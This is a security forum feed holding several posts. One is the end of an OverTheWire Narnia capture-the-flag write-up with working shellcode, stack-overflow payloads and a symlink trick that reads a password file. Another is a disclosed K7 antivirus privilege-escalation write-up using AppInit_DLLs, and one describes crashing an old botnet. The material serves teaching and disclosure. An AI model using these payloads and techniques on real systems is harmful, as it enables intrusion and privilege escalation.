    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG"); /*Assign the contents of EGG to a var called ret*/
    ret(); /*Execute ret*/

    return 0;
}
</code></pre>
<p>Since this binary runs the contents of ret, we can feed ret shell code and it will be executed.</p>
<p>As an example, I will be using a purely alphanumeric shellcode made by a friend of mine (<a href="https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-" rel="nofollow noopener">https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-</a>), so we can put the shellcode inside the environment variable called “EGG” and then run the binary.</p>
<pre><code class="lang-auto">narnia1@narnia:/narnia$ export EGG=hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
</code></pre>
<p>Just to expand upon this, the shellcode does not have to be alphanumeric, it just makes it easier if it is since you can directly put it into the env var. An example of a payload that uses non-alphanumeric shellcode would be the following:</p>
<pre><code class="lang-auto">narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'); /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
</code></pre>
<h1>Challenge 2</h1>
<p>Now we get into some “actual” binexp, with an extremely basic payload that fills ESP with nops (\x90), except for some shell code at the end, and then overwriting the ret address to be the start of ESP.</p>
<p>Here is the source code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char * argv[]){
    char buf[128]; /*Declares the buffer length to be 128 bytes*/

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]); /*Display usage*/
        exit(1);
    }
    strcpy(buf,argv[1]); /*Copy contents of arg 1 to buffer*/
    printf("%s", buf); /*Print the buffer*/

    return 0;
}
</code></pre>
<p>So we can start by getting the crash offset (which will be somewhere around 128, since this is the buffer size, although if there is something between the end of the buffer and the start of the ret address on the stack, then we will need to play with the ret addr location in the payload), for this I made a really simple bash loop that slowly increases the padding.</p>
<pre><code class="lang-bash">for i in $(seq 1 300); do echo $i; ./narnia2 $(python -c 'print "A"*'$i';'); done
</code></pre>
<p>All this does is loops from 1 to 300, and echoes out the number each time, but also prints “A” that amount of times while passing it as an argument to the binary, so we can follow the numbers until we find a segfault.</p>
<pre><code class="lang-auto">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA132
Segmentation fault
</code></pre>
<p>We can see that after 132 the binary segfaults, so that is our space we have till the ret address starts getting overwritten.</p>
<p>Now, the buffer is 128 bytes, and the ret address breaks at 132, so between the end of the buffer, and the start of the return address there are 4 bytes of “junk”, which you can just fill with nopsleds, but in our case we will just repeat the ret address 4 times (one will fall into the right position, the others are fillers).</p>
<p>So we have our padding, to get our return address, we can simply crash it with a segfault, while watching it with ltrace.</p>
<pre><code class="lang-auto">narnia2@narnia:/narnia$ ltrace ./narnia2 $(python -c 'print "A"*132')
__libc_start_main(0x804844b, 2, 0xffffd704, 0x80484a0 &lt;unfinished ...&gt;
strcpy(0xffffd5e8, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                     = 0xffffd5e8
printf("%s", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                           = 132
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
</code></pre>
<p>Ltrace shows us that strcpy tries to copy our "A"s to the address <code>0xffffd5e8</code> (the memory location of the buffer), which in little endian is: <code>\xe8\xd5\xff\xff</code>. So we have the padding, we have the return address, now we just need the shellcode. For this we can use the example alphanumeric shellcode, or we can find our own with a simple google search for “32 bit bin sh shellcode” (<a href="http://shell-storm.org/shellcode/files/shellcode-827.php" rel="nofollow noopener">http://shell-storm.org/shellcode/files/shellcode-827.php</a>).</p>
<p>So now to structure our payload, the idea is to take advantage of the fact that we control the contents of the buffer, and we also control the return address, so if we make the contents of the buffer malicious, and then return back to the start of the buffer, it will be executed.</p>
<p>So the first step is having our padding, a nop (no operation, \x90), basically makes the machine do nothing, and move on to the next instruction, so we can fill the start of the buffer with nops, up until our shellcode.</p>
<p>The shellcode takes up a total of 28 bytes, and our buffer size is 128 bytes, so that is 100 nops (128 - 28), then we have the 4 bytes of “junk”, and then the return address, to summarise:<br>
<code>\x90 x 100 + 28 (shellcode) + 4 (junk) + 4 (ret addr)</code></p>
<p>So, now we know how to build our payload, and can run it on the vulnerable binary:</p>
<pre><code class="lang-auto">narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90\x90\x90\x90" + "\xe8\xd5\xff\xff"')
$ whoami
narnia3
</code></pre>
<h1>Challenge 3</h1>
<p>For challenge three, things start to take a turn for the better, everything is a little more complex. Not in the way that the concepts are more complex, but a bit of out-of-the-box thinking is required to make the vulnerability work in your advantage.</p>
<p>We start with the following source code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null"; /*Sets the output file to /dev/null (var size is 16 bytes)*/
    char ifile[32]; /*Sets the variable size to 32 bytes*/
    char buf[32]; /*Sets the buffer size to 32 bytes*/

    if(argc != 2){ /*Print usage*/
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]); /*Copies arg to ifile var (this is vulnerable)*/
    if((ofd = open(ofile,O_RDWR)) &lt; 0 ){
        printf("error opening %s\n", ofile); /*Error handler*/
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) &lt; 0 ){
        printf("error opening %s\n", ifile); /*Error handler*/
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1); /*Read content of In File*/
    write(ofd,buf, sizeof(buf)-1); /*Write content to Out File*/
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd); /*Close both*/
    close(ofd);

    exit(1);
}
</code></pre>
<p>So, the base concept is that we can overwrite the output file to be something we can read, and we control the input file, the rest is pretty simple.</p>
<p>Here is an example of the binaries usage:</p>
<pre><code class="lang-auto">narnia3@narnia:/narnia$ touch /tmp/LetsPlay
narnia3@narnia:/narnia$ ./narnia3 /tmp/LetsPlay
copied contents of /tmp/LetsPlay to a safer place... (/dev/null)
</code></pre>
<p>We move to the /tmp directory since we control everything inside of it, now we need can start playing with the input file, we know the input buffer is 32 bytes, and the output file is 16 bytes, so we could technically make something like <code>/tmp/"z"*27</code>(32-len(’/tmp/’)), and then the file we want to write to, let’s say the output file is /tmp/outforchiv.</p>
<p>When you overflow the input variable, you also overwrite the null-byte that defines where that variable’s string ends, whereas the memory location where the outfile var starts remains the same, we can abuse this, and make the file be something like /tmp/27bytes/tmp/file, and then symlink narnia4’s password to /tmp/27bytes/tmp/file, but also make a file called /tmp/file with 777 permissions.</p>
<p>When we feed the binary this path, it will overflow the buffer, overwrite the termination byte, so the input file is taken as /tmp/27bytes/tmp/file, but the output file is just /tmp/file.</p>
<p>Let’s put this theory to test:</p>
<pre><code class="lang-auto">narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ ln -s /etc/narnia_pass/narnia4 outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ touch /tmp/outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ chmod 777 /tmp/outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ /narnia/narnia3 $(pwd)/outforchiv
copied contents of /tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp/outforchiv to a safer place... (/tmp/outforchiv)
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$
</code></pre>
<p>Now we can cat the /tmp/outforchiv file and read the password!</p>
<h1>Challenge 4</h1>
<p>Welcome to the final challenge of this writeup, it is another buffer overflow to pop a shell, so I recommend you go back and make sure you understand the basics with challenge 2.</p>
<p>We have the following source code:</p>
<pre><code class="lang-auto">#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;ctype.h&gt;

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256]; /*Defines the buffer length*/

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc&gt;1)
        strcpy(buffer,argv[1]); /*Copies the argument to the buffer (vulnerable)*/

    return 0;
}
</code></pre>
<p>We can start by getting our padding, we know the buffer size is 256, so we can start with that, next we need our return address, so we can run: <code>ltrace ./narnia4 $(python -c 'print "A"*300')</code> and then get the address that strcpy was going to copy the A’s to (in my case it was 0xffffd4d4), so we have our padding, return address, and we can re-use the shellcode from challenge 2, which is 28 bytes long.</p>
<p>Our payload will look something like this right now:<br>
<code>./narnia4 $(python -c 'print "\x90"*256 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\ x80" + "\xd4\xd4\xff\xff"*4')</code></p>
<p>To clarify, I have converted the return address to little endian format (0xffffd4d4 -&gt; \xd4\xd4\xff\xff), and I have made it appear four times consecutively in the payload to increase chances of it falling into the right place, finally, I replaced the "A"s with \x90’s or no operation bytes, so the machine will skip those bytes until it reaches our shellcode.</p>
<p>This won’t work, since there is a 4 byte address between the end of the buffer and the start of the return address, so we need to add 4 bytes to our padding, making it 260.</p>
<p>Our final exploit being:</p>
<pre><code class="lang-bash">./narnia4 $(python -c 'print "\x90"*260 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\
x80" + "\xd4\xd4\xff\xff"*4') # YOUR RETURN ADDRESS MAY VARY
</code></pre>
<p>And when we run it:</p>
<pre><code class="lang-bash">narnia4@narnia:/narnia$ ./narnia4 $(python -c 'print "\x90"*(260 - 28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\
x80" + "\xd4\xd4\xff\xff"*4')
$ whoami
narnia5
</code></pre>
<p>Bingo! I hope this writeup clarified some concepts, or helped someone start off with an idea of what is happening. If anyone has any questions, I am basically permanently reachable on both twitter (<a href="https://twitter.com/SecGus" rel="nofollow noopener">https://twitter.com/SecGus</a>), and on this platform, 0x00sec.</p>
<p>Some fun and useful resources for learning pwn are:</p>
<ul>
<li>OverTheWire Narnia (Where these challenges can be found,<a href="https://overthewire.org/wargames/narnia/" rel="nofollow noopener">https://overthewire.org/wargames/narnia/</a>)</li>
<li>Pwnable KR (<a href="http://pwnable.kr/" rel="nofollow noopener">http://pwnable.kr/</a>)</li>
<li>Root-Me (<a href="https://www.root-me.org/" rel="nofollow noopener">https://www.root-me.org/</a>)</li>
<li>HackTheBox (<a href="https://hackthebox.eu" rel="nofollow noopener">https://hackthebox.eu</a>)</li>
</ul>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362</link>
          <pubDate>Tue, 31 Dec 2019 02:38:05 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-18362</guid>
          <source url="https://d.clarkee.co.uk/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362.rss">OverTheWire Narnia challenges 0-4 Writeups (Binary exploitation basics with explanations)</source>
        </item>
        <item>
          <title>Anti-virus Exploitation: Local Privilege Escalation in K7 Security (CVE-2019-16897)</title>
          <dc:creator><![CDATA[dtm]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1>Anti-virus Exploitation</h1>
<p>Hey guys, long time no article! Over the past few months, I have been looking into exploitation of anti-viruses via logic bugs. I will briefly discuss the approach towards performing vulnerability research of these security products using the vulnerability I discovered in K7 Security as an example.</p>
<p><strong>Disclaimer</strong>: I do not claim to know everything about vulnerability research nor exploitation so if there are errors in this article, please let me know.</p>
<h2>Target Selection</h2>
<p>Security products such as anti-viruses are an attractive target (at least for me) because they operate in a trusted and privileged context in both the kernel, as a driver, and userland, as a privileged service. This means that they have the ability to facilitate potential escalation of privilege or otherwise access privileged functionality. They have a presence in the low-privileged space of the operating system. For example, there may exist a UI component with which the user can interact, sometimes allowing options to be changed such as enabling/disabling anti-virus, adding directory or file exclusions, and scanning files for malware. Anti-viruses must also access and perform operations on operating system objects to detect malware, such as reading files, registry keys, memory, etc. as well as being able to do privileged actions to keep the system in a protected state no matter the situation. It is between this trusted, high privilege space and the untrusted, low privileged space where interesting things occur.</p>
<h2>Attack Surface</h2>
<p>As aforementioned, anti-viruses live in both sides of the privilege boundary as shown in the following diagram:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Example anti-virus's interactions" data-orig-src="upload://faASbYw3C94QMzz1zYMDt9OXDH2.jpeg" width="690" height="363"><br>
Whatever crosses the line between high and low privilege represents the attack surface.</p>
<p>Let’s look at how this diagram can be interpreted. The user interface shares common operations with the service process which is expected. If the user wants to carry out a privileged action, the service will do it on its behalf, assuming that security checks are passed. If the user wishes to change a setting, they open the user interface and click a button. This is communicated to the service process via some form of inter-process communication (IPC) which will perform the necessary actions, e.g. the anti-virus stores its configuration in the registry and therefore, the service will open the relevant registry key and modify some data. Keep in mind that the registry key is stored in the <code>HKEY_LOCAL_MACHINE</code> hive which is in high privilege space, thus requiring a high privilege process to modify its data. So the user, from low privilege, is able to indirectly modify a high privilege object.</p>
<p>One more example. A user can scan for malware through the user interface (of course, what good is an anti-virus if they disallow the user from scanning for malware?). A simple, benign operation, what could go wrong? Since it is the responsibility of the service process to perform the malware scan, the interface communicates the information to the service process to target a file. It must interact with the file in order to perform the scan, i.e. it must locate the file on disk and read its content. If, while the file data has been read and is being scanned for malware, and the anti-virus does not lock the file on disk, it is possible for the malware to be replaced with a <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/symbolic-links"><em>symbolic link</em> </a> pointing to a file in a high privileged directory (yes, it is possible), let’s use <code>notepad.exe</code>. When the scan is completed and has been determined to be malware, the service process can delete the file. However, the malware has been replaced with a link to <code>notepad.exe</code>! If the anti-virus does not detect and reject the symbolic link, it will delete <code>notepad.exe</code> without question. This is an example of a <a href="https://capec.mitre.org/data/definitions/29.html">Time of Check to Time of Use (TOCTOU)</a> race condition bug. Again, the user, from low privilege, is able to indirectly modify a high privilege object because of the service process acting as a broker.</p>
<hr>
<h1>Exploitation</h1>
<p>This vulnerability allows a low privilege user to modify (almost) arbitrary registry data through the anti-virus’s settings. However, a low privileged user (non administrator) <s>cannot</s> should not be able to change the anti-virus’s settings.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Admin check" data-orig-src="upload://7cGBYbGu1G3V3NmC4K1rUm9VZlL.png" width="690" height="498"></p>
<h2>Bypassing Administrative Checks</h2>
<p>To narrow down how this administration check is performed, procmon can be used to identify operating system activity as the settings page is accessed again. This will trigger the anti-virus to recheck the administrative status of the current user while it interacts with the operating system as it is being logged.  Of course, since we are low privilege and procmon requires high privilege, it is not practical in a real environment. However, because we control the testing environment, we can allow procmon to run as we have access to an administrator account. Setting promon to filter by <code>K7TSMain</code> as the process name will capture activity performed by the user interface process.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="procmon%20filter" data-orig-src="upload://ge7qbKRm4zeOTQKg4b9FcWkEgV4.png" width="515" height="324"><br>
When procmon starts to log, attempting to access the settings page again in the UI will trigger procmon to instantly show results:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="procmon%20admin%20check" data-orig-src="upload://3FVoz24HFvGvqVwltZlKZWGWN4d.png" width="690" height="291"><br>
It can be seen that the anti-virus stores the administrative check in the registry in <code>AdminNonAdminIsValid</code>. Looking at the value in the Event Properties window shows that it returned <code>0</code>, meaning that non administrator users are not allowed. But there is a <em>slight</em> problem here. Bonus points if you can spot it.</p>
<p>Now that we know where the check is being performed, the next step is bypassing it. procmon shows that the process is running in low privilege space as indicated by the user and the medium integrity meaning that we own the process. If it is not protected, we can simply hook the <code>RegQueryValue</code> function and modify the return value.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Attaching%20to%20K7TSMain" data-orig-src="upload://8fauZJXj4k9F36pypVxeIUTyYfn.png" width="690" height="306"><br>
Attempting to attach to the <code>K7TSMain.exe</code> process using x32dbg is allowed! The breakpoint on <code>RegQueryValueExA</code> has been set for when we try to access the settings page again.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Triggering%20RegQueryValueExA%20breakpoint" data-orig-src="upload://6qXGexr4vnH7LnCNzvsKhdCbk3G.png" width="690" height="374"><br>
x32dbg catches the breakpoint when the settings page is clicked. The value name being queried is <code>ProductType</code> but we want <code>AdminNonAdminIsValid</code>, so continuing on will trigger the next breakpoint:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Breakpoint%20on%20AdminNonAdminIsValid" data-orig-src="upload://fgI1VMCEi7vX8FfU9huJ9MGJHj2.png" width="690" height="458"><br>
Now we can see <code>AdminNonAdminIsValid</code>. To modify the return value, we can allow the function to run until return. However, the calling function looks like a wrapper for <code>RegQueryValueExA</code>:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="RegQueryValueExA%20wrapper%20function" data-orig-src="upload://bl8AlxwDRrAFAZImnhpjnWIoIeW.png" width="541" height="187"><br>
So continuing again until return reveals the culprit function that performs the check:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Admin%20check%20function" data-orig-src="upload://5tjkjvy7WKnqKb3S42Ra36s3RP2.png" width="690" height="143"><br>
There is an obvious check there for the value <code>1</code> however, the current returned value for the registry data is <code>0</code>. This decides the return value of this function so we can either change <code>[esp+4]</code> or change the return value to bypass the check:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Bypass%20admin%20check" data-orig-src="upload://hP3hxjMXiaAnmntIL4rYW4ttks8.png" width="690" height="421"></p>
<h2>Intercepting Inter-process Communication</h2>
<p>Multiple <a href="https://docs.microsoft.com/en-us/windows/win32/ipc/interprocess-communications">inter-process communication methods</a> are available on Windows such as mailslots, file mapping, COM, and named pipes. We must figure out which is implemented in the product to be able to analyse the protocol. An easy way to do this is by using API Monitor to log select function calls made by the process. When we do this and then apply a changed setting, we can see references to named pipe functions:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="API Monitor" data-orig-src="upload://92rBa2ozIBxYX4Gd60o4OMQlkYs.png" width="690" height="327"><br>
Note that the calling module is <code>K7AVOptn.dll</code> instead of <code>K7TSMain.exe</code>. If we have a look at the data being communicated through <code>TransactNamedPipe</code>, we can see some interesting information:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Extension names" data-orig-src="upload://Aqg4uDpnt2mmRwJZpfKYclAj63Z.png" width="690" height="199"><br>
The first thing that pops out is that it looks like a list of extension names (<code>.ocx</code>, <code>.exe</code>, <code>.com</code>) separated with <code>|</code> where some have wildcard matching. This could be a list of extensions to scan for malware. If we have a look at the registry where the anti-virus stores its configuration, we can see something similar under the value <code>ScanExtensions</code> in the <code>RTFileScanner</code> key:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="image" data-orig-src="upload://ciUr1asLYvN6Uw716jTaJvlZTxK.png" width="589" height="499"><br>
Continuing down the list of calls, one of them contains some very intriguing data:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="image" data-orig-src="upload://hqDuUSlC8aNrL2dtJQxJ27AwNlV.png" width="690" height="407"><br>
It looks as though the anti-virus is applying values by specifying (privileged) registry keys and their values by their full key path. The next obvious step is to see if changing one of the keys and their values will work. This can be done by breakpointing on the <code>TransactNamedPipe</code> function in x32dbg:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="TransactNamedPipe" data-orig-src="upload://v7CF3qslcDS6gsZB0a556giScqY.png" width="690" height="495"><br>
Once here, locate the input buffer in the second argument and alter the data to add or change a key in the <code>HKEY_LOCAL_MACHINE</code> hive like so:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Changing registry keys and values" data-orig-src="upload://aF9Zpbz6dsMVjzrNyQJgWRRLObA.png" width="690" height="151"><br>
If it is possible to change this registry key’s values, high privileged processes will be forced to load the DLLs listed in <code>AppInit_DLLs</code>, i.e. one that we control. The <code>LoadAppInit_DLLs</code> value must also be set to <code>1</code> (it is <code>0</code> by default) to enable this functionality. The result:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Modified registry values" data-orig-src="upload://bTf9fhQyS2zrD9mm4tmRLZT4ayc.png" width="690" height="382"></p>
<h2>Triggering the Payload</h2>
<p>You may have noticed that the registry key resides within <code>Wow6432Node</code> which is the 32-bit counterpart of the registry. This is because the product is 32-bit and so Windows will automatically redirect registry changes. In 64-bit Windows, processes are usually 64-bit and so the chances of loading the payload DLL through <code>AppInit_DLLs</code> is unlikely. A reliable way is to make use of the anti-virus because it is 32-bit assuming a privileged component can be launched. The easiest way to do this is to restart the machine because it will reload all of the anti-virus’s processes however, it is not always practical nor is it clean. Clicking around the UI reveals that the update function runs <code>K7TSHlpr.exe</code> under the <code>NT AUTHORITY\SYSTEM</code> user:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="K7TSHlpr update" data-orig-src="upload://2fJrD136ohpjBN1xl8ydPsecwUH.png" width="690" height="220"></p>
<p>As it is a 32-bit application, Windows will load our <code>AppInit_DLLs</code> DLL into the process space.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="image" data-orig-src="upload://c1NuOJytpk5luJrUgjmPTG3on0c.png" width="690" height="432"><br>
Using <code>system("cmd")</code> as the payload will prompt the user with an interactive session in the context of the <code>NT AUTHORITY\SYSTEM</code> account via the <code>UI0Detect</code> service:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="UI0Detect" data-orig-src="upload://j3frEI9S5piT29B6tvNq7bLQxmz.png" width="468" height="291"><br>
Selecting to view the message brings up the following:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Interactive session" data-orig-src="upload://by4zLKwXQR08nbycpSnLTkjvYld.png" width="620" height="500"><br>
We have root! <img src="https://0x00sec.org/images/emoji/twitter/sunglasses.png?v=9" title=":sunglasses:" class="emoji" alt=":sunglasses:"></p>
<h2>Automated Exploit</h2>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/1/1899bac9059d7f4f63ded7774d9d9ecb86f6e253.gif" data-download-href="/uploads/short-url/3vCP3xZHcnFFLWDyzvcVQusGzvl.gif?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1899bac9059d7f4f63ded7774d9d9ecb86f6e253_2_690x395.gif" alt="" data-base62-sha1="3vCP3xZHcnFFLWDyzvcVQusGzvl" width="690" height="395" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1899bac9059d7f4f63ded7774d9d9ecb86f6e253_2_690x395.gif, https://0x00sec.s3.amazonaws.com/optimized/2X/1/1899bac9059d7f4f63ded7774d9d9ecb86f6e253_2_1035x592.gif 1.5x, /uploads/default/original/2X/1/1899bac9059d7f4f63ded7774d9d9ecb86f6e253.gif 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1899bac9059d7f4f63ded7774d9d9ecb86f6e253_2_10x10.png"></a></div><p></p>
<hr>
<p><a href="https://github.com/NtRaiseHardError/Antimalware-Research/tree/master/K7%20Security/Local%20Privilege%20Escalation/v16.0.0120">Link to my GitHub for the advisory and an automated exploit</a>.</p>
            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/anti-virus-exploitation-local-privilege-escalation-in-k7-security-cve-2019-16897/17655">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/anti-virus-exploitation-local-privilege-escalation-in-k7-security-cve-2019-16897/17655</link>
          <pubDate>Sun, 24 Nov 2019 13:08:01 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-17655</guid>
          <source url="https://d.clarkee.co.uk/t/anti-virus-exploitation-local-privilege-escalation-in-k7-security-cve-2019-16897/17655.rss">Anti-virus Exploitation: Local Privilege Escalation in K7 Security (CVE-2019-16897)</source>
        </item>
        <item>
          <title>Exploit Reporting Guidelines</title>
          <dc:creator><![CDATA[127.0.0.1]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Exploit development to me seems like a world without rules and guidelines. Any one can do what ever he or she wants to do. When I look at exploitdb it seems there are no guide lines for exploits being development for software application.</p>
<p>Any there are guideline for reporting exploits if you find them?</p>
            <p><small>9 posts - 7 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/exploit-reporting-guidelines/17034">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/exploit-reporting-guidelines/17034</link>
          <pubDate>Sat, 19 Oct 2019 15:20:03 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-17034</guid>
          <source url="https://d.clarkee.co.uk/t/exploit-reporting-guidelines/17034.rss">Exploit Reporting Guidelines</source>
        </item>
        <item>
          <title>Crashing Hackarmy Botnet</title>
          <dc:creator><![CDATA[hunter]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Hello all!</p>
<p>I’ve been away for a while. Yet I’m here with a new story for you!<br>
This is a short story of me encountering a vulnerability while analyzing a malware. I hope you will enjoy it <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<p>If you have read the black covered “Secrets of Reverse Engineering” you may remember Hackarmy botnet client. Its a really old IRC botnet malware from 2009. I was supposed to analyse it during an assesment I have entered. Questions were relatively trivial like; “What’s the c2 this malware connects to?” and such. But while I was inspecting its code, something caught my attention in its IRC command parser.</p>
<p>This malware connects to an IRC server which is hardcoded inside it. Joins a specific channel. Then starts waiting to receive commands through <strong>private message</strong>.<br>
Normally, it expects a specific password value to be sent before starting to process anything. This prevents unauthorized execution of a command.<br>
However this vulnerability is directly in a part which is parsing “PRIVMSG” command of IRC. So crashing this malware doesn’t require any knowledge of password beforehand. Yay! <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
<p>Take a look at the following snippet<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/0/098dcb2295ed448fb0661de27ff7d041dac9041b.png" data-download-href="/uploads/short-url/1mw5tO09j5sQpDLnUSBs5xRi391.png?dl=1" title="resim"><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/098dcb2295ed448fb0661de27ff7d041dac9041b.png" alt="resim" data-base62-sha1="1mw5tO09j5sQpDLnUSBs5xRi391" width="690" height="473"></a></div><p></p>
<p>When malware receives a data over the network:</p>
<ol>
<li>It first compares first 7 bytes to “PRIVMSG” to see if it has received an irc private message.</li>
<li>If its indeed a private message it searches the string " :" (without quotes) and retrieves the beginning address of first occurence.</li>
</ol>
<p>Now lets take a look at what a PRIVMSG command looks like.</p>
<blockquote>
<p>PRIVMSG Wiz :Hello are you receiving this message ?</p>
</blockquote>
<p>So according to search operation above now you got;</p>
<ul>
<li>" :Hello are you receiving this message?"</li>
</ul>
<p>Afterward it calculates <em>address_of_first_occurence + 2</em>, namely the location which actual body of the message begins. It then proceed to read the first byte and compare it to char ‘!’ (some commands this malware receive start with exclamation mark).</p>
<p>Here the malware assumes PRIVMSG commands will indeed contain a space and column. I went on to try to send one without it and see what will happen. As I suspected the IRC server redirected the private message nonetheless. And since malware couldn’t parse it properly it crashed.</p>
